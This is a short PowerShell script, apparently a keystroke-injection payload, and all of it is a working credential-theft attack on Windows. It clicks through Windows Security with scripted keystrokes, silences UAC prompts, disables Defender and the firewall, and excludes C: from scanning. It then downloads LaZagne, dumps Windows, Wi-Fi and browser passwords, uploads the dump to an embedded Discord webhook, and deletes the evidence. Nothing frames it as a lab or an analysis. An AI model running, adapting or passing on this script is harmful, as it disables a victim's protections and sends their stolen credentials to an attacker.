Start-Process "windows security" -Wait
Start-Sleep -Milliseconds 1000
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
Start-Sleep -Milliseconds 500
1..4 | ForEach-Object { [System.Windows.Forms.SendKeys]::SendWait("{TAB}"); Start-Sleep -Milliseconds 100 }
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait(" ")
Start-Sleep -Milliseconds 1000
[System.Windows.Forms.SendKeys]::SendWait("%y")
Start-Sleep -Milliseconds 1000
[System.Windows.Forms.SendKeys]::SendWait("%{F4}")
Start-Sleep -Milliseconds 3000

Start-Process powershell -Verb RunAs -Wait -ArgumentList "Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0"
Start-Sleep -Milliseconds 1000

Start-Process powershell -Verb RunAs -Wait -ArgumentList "Set-MpPreference -DisableRealtimeMonitoring $true"
Start-Sleep -Milliseconds 1000
Start-Process powershell -Verb RunAs -Wait -ArgumentList "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
Start-Sleep -Milliseconds 1000

Start-Process powershell -Verb RunAs -Wait -ArgumentList "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
Start-Sleep -Milliseconds 1000
Start-Process powershell -Verb RunAs -Wait -ArgumentList "Add-MpPreference -ExclusionPath 'C:'"
Start-Sleep -Milliseconds 3000

$TempPath = [System.Environment]::GetEnvironmentVariable('TEMP','Machine')
Start-BitsTransfer -Source "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -Destination "$TempPath/l.exe"
Set-Location $TempPath
Start-Sleep -Seconds 15
.\l.exe windows -vv > "$env:computername.txt";.\l.exe wifi -vv >> "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
curl.exe https://discord.com/api/webhooks/1246076287580115045/2xidT8BNCNkVxLdC64rjp04Oul87fDUVtTSHN-gEil_vhYAFDmfLUuYaDIbkHNe8RKKI -F "file1=@$TempPath/$env:computername.txt"
Remove-Item "$TempPath/$env:computername.txt", "$TempPath/l.exe" -Force -ErrorAction SilentlyContinue

exit